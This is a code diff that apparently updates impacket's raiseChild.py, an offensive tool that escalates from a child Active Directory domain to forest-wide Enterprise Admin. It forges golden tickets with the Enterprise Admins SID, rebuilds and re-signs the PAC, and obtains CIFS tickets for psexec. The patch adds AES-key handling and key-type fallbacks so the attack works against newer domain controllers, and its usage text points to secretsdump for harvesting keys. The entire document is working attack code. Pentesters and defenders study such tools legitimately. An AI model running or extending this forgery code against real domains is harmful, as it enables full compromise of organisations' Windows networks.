@@ -984,20 +984,13 @@ class RAISECHILD:
         # Let's now clear the checksums
         if PAC_SERVER_CHECKSUM in pacInfos:
             serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
-            if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                serverChecksum['Signature'] = b'\x00'*12
-            else:
-                serverChecksum['Signature'] = b'\x00'*16
+            serverChecksum['Signature'] = b'\x00' * len(bytes(serverChecksum['Signature']))
         else:
             raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
 
         if PAC_PRIVSVR_CHECKSUM in pacInfos:
             privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-            privSvrChecksum['Signature'] = b'\x00'*12
-            if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                privSvrChecksum['Signature'] = b'\x00'*12
-            else:
-                privSvrChecksum['Signature'] = b'\x00'*16
+            privSvrChecksum['Signature'] = b'\x00' * len(bytes(privSvrChecksum['Signature']))
         else:
             raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
 
@@ -1009,76 +1002,85 @@ class RAISECHILD:
 
 
         # We changed everything we needed to make us special. Now let's repack and calculate checksums
-        serverChecksumBlob = serverChecksum.getData()
-        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))
+        # Update modified buffers in pacInfos
+        pacInfos[PAC_LOGON_INFO] = validationInfoBlob
+        pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
+        pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
 
-        privSvrChecksumBlob = privSvrChecksum.getData()
-        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))
+        # Rebuild PAC preserving ALL original buffers in original order
+        def align8(data): return b'\x00' * (((len(data) + 7) // 8 * 8) - len(data))
 
-        # The offset are set from the beginning of the PAC_TYPE
-        # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(PAC_INFO_BUFFER().getData())*4
+        # Recalculate offsets: header = 8 + num_buffers * sizeof(PAC_INFO_BUFFER)
+        numBuffers = len(pacInfos)
+        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * numBuffers
 
-        # Let's build the PAC_INFO_BUFFER for each one of the elements
-        validationInfoIB = PAC_INFO_BUFFER()
-        validationInfoIB['ulType'] = PAC_LOGON_INFO
-        validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
-        validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
-
-        pacClientInfoIB = PAC_INFO_BUFFER()
-        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
-        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
-        pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
-
-        serverChecksumIB = PAC_INFO_BUFFER()
-        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
-        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
-        serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
-
-        privSvrChecksumIB = PAC_INFO_BUFFER()
-        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
-        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
-        privSvrChecksumIB['Offset'] = offsetData
-        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
-
-        # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
-            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
-            pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
-        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
+        infoBuffers = b''
+        dataBlobs = b''
+        for ulType, data in pacInfos.items():
+            ib = PAC_INFO_BUFFER()
+            ib['ulType'] = ulType
+            ib['cbBufferSize'] = len(data)
+            ib['Offset'] = offsetData
+            infoBuffers += ib.getData()
+            padding = align8(data)
+            dataBlobs += data + padding
+            offsetData = (offsetData + len(data) + 7) // 8 * 8
 
         pacType = PACTYPE()
-        pacType['cBuffers'] = 4
+        pacType['cBuffers'] = numBuffers
         pacType['Version'] = 0
-        pacType['Buffers'] = buffers + buffersTail
+        pacType['Buffers'] = infoBuffers + dataBlobs
 
         blobToChecksum = pacType.getData()
 
         # If you want to do MD5, ucomment this
         checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
-        if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
+        sigLen = len(bytes(serverChecksum['Signature']))
+        if sigLen == 12 and aesKey:
+            keyServer = Key(Enctype.AES256, unhexlify(aesKey))
+            serverChecksum['SignatureType'] = constants.ChecksumTypes.hmac_sha1_96_aes256.value
+            checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
+        elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
             keyServer = Key(Enctype.AES256, unhexlify(aesKey))
         elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
             keyServer = Key(Enctype.RC4, unhexlify(ntHash))
         else:
-            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'] )
+            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])
 
-        checkSumFunctionPriv= _checksum_table[privSvrChecksum['SignatureType']]
-        if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
+        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
+        privSigLen = len(bytes(privSvrChecksum['Signature']))
+        if privSigLen == 12 and aesKey:
+            keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
+            privSvrChecksum['SignatureType'] = constants.ChecksumTypes.hmac_sha1_96_aes256.value
+            checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
+        elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
             keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
         elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
             keyPriv = Key(Enctype.RC4, unhexlify(ntHash))
         else:
-            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'] )
+            raise Exception('Invalid Priv checksum type 0x%x' % privSvrChecksum['SignatureType'])
 
         serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, 17, blobToChecksum)
         privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, 17, serverChecksum['Signature'])
 
-        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
-        pacType['Buffers'] = buffers + buffersTail
+        # Update checksums in pacInfos and rebuild final PAC
+        pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
+        pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
+
+        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * numBuffers
+        infoBuffers = b''
+        dataBlobs = b''
+        for ulType, data in pacInfos.items():
+            ib = PAC_INFO_BUFFER()
+            ib['ulType'] = ulType
+            ib['cbBufferSize'] = len(data)
+            ib['Offset'] = offsetData
+            infoBuffers += ib.getData()
+            padding = align8(data)
+            dataBlobs += data + padding
+            offsetData = (offsetData + len(data) + 7) // 8 * 8
+
+        pacType['Buffers'] = infoBuffers + dataBlobs
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
@@ -1127,36 +1129,52 @@ class RAISECHILD:
         userName = Principal(childCreds['username'], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         TGT = {}
         TGS = {}
-        while True:
+
+        # Build ordered list of credential attempts: AES first (modern DCs), then RC4, then password
+        credAttempts = []
+        if childCreds['aesKey'] is not None:
+            credAttempts.append(('AES', {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
+        if childCreds['nthash'] != '':
+            credAttempts.append(('RC4', {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}))
+        if not credAttempts:
+            credAttempts.append(('password', {'lmhash': b'', 'nthash': b'', 'aesKey': None}))
+
+        tgt = cipher = oldSessionKey = sessionKey = None
+        for credType, cred in credAttempts:
             try:
+                logging.info('Trying %s for TGT request' % credType)
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'],
-                                                                        childCreds['domain'], childCreds['lmhash'],
-                                                                        childCreds['nthash'], None, self.__kdcHost)
+                                                                        childCreds['domain'], cred['lmhash'],
+                                                                        cred['nthash'], cred['aesKey'], self.__kdcHost)
+                logging.info('TGT obtained using %s' % credType)
+                break
             except KerberosError as e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
-                        childCreds['nthash'] = compute_nthash(childCreds['password'])
-                        continue
-                    else:
-                        raise
+                if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value,
+                                        constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
+                    logging.warning('%s failed (error 0x%x), trying next method' % (credType, e.getErrorCode()))
+                    continue
                 else:
                     raise
+        if tgt is None:
+            raise Exception('Could not obtain TGT with any available credentials (tried: %s)' % ', '.join(c[0] for c in credAttempts))
 
-            # We have a TGT, let's make it golden
-            goldenTicket, cipher, sessionKey = self.makeGolden(tgt, cipher, sessionKey, credentials['nthash'],
-                                                               credentials['aesKey'], entepriseSid + '-519')
+        # Track which krbtgt key type we're using for golden ticket forging
+        # Start with RC4, fall back to AES from DCSync'd krbtgt creds if available
+        goldenKeyAttempts = []
+        goldenKeyAttempts.append(('RC4', credentials['nthash'], credentials['aesKey']))
+        if credentials['aesKey'] and credentials['aesKey'] != b'':
+            goldenKeyAttempts.append(('AES', credentials['nthash'], credentials['aesKey']))
+
+        for goldenKeyType, ntHash, aesKey in goldenKeyAttempts:
+            # Re-obtain TGT for each attempt since makeGolden consumes it
+            tgt2, cipher2, oldSessionKey2, sessionKey2 = tgt, cipher, oldSessionKey, sessionKey
+            goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt2, cipher2, sessionKey2, ntHash,
+                                                                           aesKey, entepriseSid + '-519')
             TGT['KDC_REP'] = goldenTicket
-            TGT['cipher'] = cipher
-            TGT['oldSessionKey'] = oldSessionKey
-            TGT['sessionKey'] = sessionKey
+            TGT['cipher'] = goldenCipher
+            TGT['oldSessionKey'] = oldSessionKey2
+            TGT['sessionKey'] = goldenSessionKey
 
-            # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
             if self.__target is None:
                 serverName = Principal('cifs/%s' % self.getMachineName(gethostbyname(parentName)),
                                        type=constants.PrincipalNameType.NT_SRV_INST.value)
@@ -1164,29 +1182,30 @@ class RAISECHILD:
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
             try:
                 logging.debug('Getting TGS for SPN %s' % serverName)
+                print('[*] Golden ticket etype: %s (using %s krbtgt key)' % (goldenCipher.enctype, goldenKeyType))
+                print('[*] Requesting TGS for %s' % serverName)
                 tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName,
-                                                                                        childCreds['domain'], None,
-                                                                                        goldenTicket, cipher,
-                                                                                        sessionKey)
+                                                                                        childCreds['domain'], self.__kdcHost,
+                                                                                        goldenTicket, goldenCipher,
+                                                                                        goldenSessionKey)
+                TGT['cipher'] = goldenCipher
+                TGT['sessionKey'] = goldenSessionKey
                 TGS['KDC_REP'] = tgsCIFS
                 TGS['cipher'] = cipherCIFS
                 TGS['oldSessionKey'] = oldSessionKeyCIFS
                 TGS['sessionKey'] = sessionKeyCIFS
                 break
             except KerberosError as e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
-                        childCreds['nthash'] = compute_nthash(childCreds['password'])
-                    else:
-                        raise
+                if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_TGT_REVOKED.value,
+                                        constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value):
+                    logging.warning('Golden ticket with %s key rejected (0x%x), trying next key type' % (goldenKeyType, e.getErrorCode()))
+                    continue
                 else:
                     raise
+            else:
+                break
+        else:
+            raise Exception('Golden ticket was rejected with all available krbtgt key types')
 
         # 6) Use the generated ticket to log into the parent and get the krbtgt/admin info
         # 6) Use the generated ticket to log into the parent and get the target-user info
@@ -1279,13 +1298,17 @@ if __name__ == '__main__':
         print("\tpython raiseChild.py childDomain.net/adminuser\n")
         print("\tthe password will be asked, or\n")
         print("\tpython raiseChild.py childDomain.net/adminuser:mypwd\n")
-        print("\tor if you just have the hashes\n")
+        print("\tor if you just have the NTLM hashes\n")
         print("\tpython raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser\n")
-
+        print("\tor if you have the AES key (recommended for modern Windows Server 2019/2022/2025)\n")
+        print("\tpython raiseChild.py -aesKey <hex_aes256_key> childDomain.net/adminuser\n")
+        print("\tor combine both - AES will be tried first, RC4 used as fallback\n")
+        print("\tpython raiseChild.py -hashes LMHASH:NTHASH -aesKey <hex_aes256_key> childDomain.net/adminuser\n")
+        print("\tNote: AES keys can be obtained via: impacket-secretsdump -just-dc-user DOMAIN/username ...\n")
         print("\tThis will perform the attack and then psexec against target-exec as Enterprise Admin")
-        print("\tpython raiseChild.py -target-exec targetHost childDomainn.net/adminuser\n")
+        print("\tpython raiseChild.py -target-exec targetHost childDomain.net/adminuser\n")
         print("\tThis will perform the attack and then psexec against target-exec as User with RID 1101")
-        print("\tpython raiseChild.py -target-exec targetHost -targetRID 1101 childDomainn.net/adminuser\n")
+        print("\tpython raiseChild.py -target-exec targetHost -targetRID 1101 childDomain.net/adminuser\n")
         print("\tThis will save the final goldenTicket generated in the ccache target file")
         print("\tpython raiseChild.py -w ccache childDomain.net/adminuser\n")
         sys.exit(1)
